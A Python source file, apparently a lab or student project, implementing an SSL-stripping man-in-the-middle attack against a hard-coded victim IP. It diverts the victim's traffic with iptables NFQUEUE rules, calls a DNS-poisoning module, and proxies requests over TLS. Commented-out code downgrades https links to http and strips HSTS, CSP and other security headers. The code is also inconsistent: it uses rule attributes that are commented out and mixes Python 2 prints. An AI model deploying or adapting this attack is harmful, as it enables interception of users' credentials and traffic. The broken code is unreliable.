from scapy.all import *
from netfilterqueue import NetfilterQueue
from scapy.layers.http import *
from scapy.layers.tls import *
import os
import threading
import time

import dns_poisoning

load_layer("tls")    
load_layer("http")    

class SslRemover():

    def __init__(self, ip_victim, queue_num):

        self.ip_victim     = ip_victim
        self.queue         = NetfilterQueue()
        self.iprule_add    = "iptables -I INPUT -p tcp -s {} -j NFQUEUE --queue-num {}".format(ip_victim, queue_num)
#        self.iprule2_add    = "iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 80"
        self.iprule_remove    = "iptables -D INPUT -p tcp -s {} -j NFQUEUE --queue-num {}".format(ip_victim, queue_num)
#        self.iprule2_remove = "iptables -t nat -D PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 80"
        self.thread        = threading.Thread(name="ssl-remover-{}".format(queue_num), target=self.queue.run)
        self.thread.setDaemon(True)
        self.queue.bind(queue_num, self.handle_packet)
        self.tls_automata = {}

    def handle_packet(self, packet_nfqueue):
        
        packet_scapy = packet_nfqueue.get_payload()

        if packet_scapy.haslayer(HTTPRequest):
            self.handle_request(packet_scapy[HTTPRequest])

    def get_automaton(self, host):

        try:
            return self.tls_automata[host]

        except KeyError as _:
            return None

    def handle_request(self, packet_scapy):

        tls_automaton = self.get_automaton(packet_scapy.Host)

        if tls_automaton:
            tls_automaton.send(HTTP(clsreq = packet_scapy))

        else:
            self.add_automaton(packet_scapy.Host)

    def add_automaton(self, host):

        self.tls_automata[host] = TLSClientAutomaton.tls_link(HTTP, server=host, dport=443)

#    def stripped_victim_automation(self):
#        #socket = TCP_client.tcpautomaton(HTTP, <>, 80)
#        pass
#
#
#    def tls_client_automation(self):
#        #greeting = TLSClientHello(ciphers=<int code of the cipher suite>)
#        connection = TLSClientAutomaton(dport=50000, client_hello=ch)
#        connection.run()
#
#    def handle_packet(self, packet_nfqueue):
#        packet_scapy = IP(packet_nfqueue.get_payload())
#        #if not packet_scapy.haslayer(Raw):
#        #    return packet_nfqueue.accept()
#        #print "\n"
#        #print packet_scapy.show()
#        #print "\n"
#        #if packet_scapy.haslayer(Raw):
#            #payload = packet_scapy[Raw].load
#            #if 'https' in payload:
#            #    payload = payload.replace('https', 'http')
#            #    packet_scapy[Raw].load = payload
#            #    print "Changed Raw Payload"
#            #    print packet_scapy[Raw].load
#            #    del packet_scapy[IP].len
#            #    del packet_scapy[IP].chksum
#            #    del packet_scapy[TCP].chksum
#            #    packet_nfqueue.set_payload(bytes(packet_scapy))
#            #return packet_nfqueue.accept()
#
#        if packet_scapy.haslayer(HTTPResponse):
#            print packet_scapy.show()
#            packet_scapy[HTTPResponse].Location = (packet_scapy[HTTPResponse].Location).replace("https://", "http://")
#            print packet_scapy[HTTPResponse].Location
#            del packet_scapy[HTTPResponse].Strict_Transport_Security
#            del packet_scapy[HTTPResponse].Public_Key_Pins
#            del packet_scapy[HTTPResponse].Content_Security_Policy
#            del packet_scapy[HTTPResponse].X_XSS_Protection
#            del packet_scapy[HTTPResponse].X_Frame_Options
#
#            packet_nfqueue.set_payload(bytes(packet_scapy))
#            return packet_nfqueue.accept()
#
#
#        if packet_scapy.haslayer(HTTPRequest):
#            http_layer = packet_scapy[HTTPRequest]
#            ip_layer = packet_scapy[IP]
#
#            print "HTTP Request to {}{}".format(http_layer.Host.decode(), http_layer.Path.decode())
#            
#
#            new_packet = IP(src=ip_layer.src, dst=ip_layer.dst) / \
#                         TCP(sport=packet_scapy[TCP].sport, dport=packet_scapy[TCP].dport, flags="PA") / \
#                         HTTPRequest(
#                             Method=http_layer.Method,
#                             Host=http_layer.Host,
#                             Path=http_layer.Path,
#                             User_Agent=http_layer.User_Agent,
#                             Accept=http_layer.Accept,
#                             Accept_Language=http_layer.Accept_Language,
#                             Accept_Encoding=http_layer.Accept_Encoding,
#                             Connection=b'close'
#                         )
#            #send(new_packet)
#            print "Request packet made"
#
#             # Create a fake HTTP response
#            response_packet = IP(src=ip_layer.dst, dst=ip_layer.src) / \
#                              TCP(sport=packet_scapy[TCP].dport, dport=packet_scapy[TCP].sport, flags="PA") / \
#                              HTTPResponse(
#                                  Content_Type=b"text/html",
#                                  Content_Length=str(len([0,1,2])),
#                                  Server=b"FakeServer"
#                              )
#    
#            # Send the fake response
#            #send(response_packet)
#            print "Response packet made"
#
#        return packet_nfqueue.accept()

    def start(self):

        os.system(self.iprule_add)    #make sure SSL ssling
        os.system(self.iprule2_add)    #make sure SSL ssling
        self.thread.start()    #queue starts accepting packages

        print "SSL stripping started"

    def stop(self):

        os.system(self.iprule_remove)    #make sure SSL nbot ssling
        os.system(self.iprule2_remove)    #make sure SSL nbot ssling
        self.queue.unbind()    #delete queue

        print "SSL stripping stopped"

def test_cb():

    dns_poisoning.test()

    ip_victim = "10.0.123.5"

    ssl_remover = SslRemover(ip_victim, 2)

    ssl_remover.start()
    time.sleep(20)
    ssl_remover.stop()

def test():

    thread = threading.Thread(target=test_cb)
    thread.run()

if __name__ == "__main__":

    test()
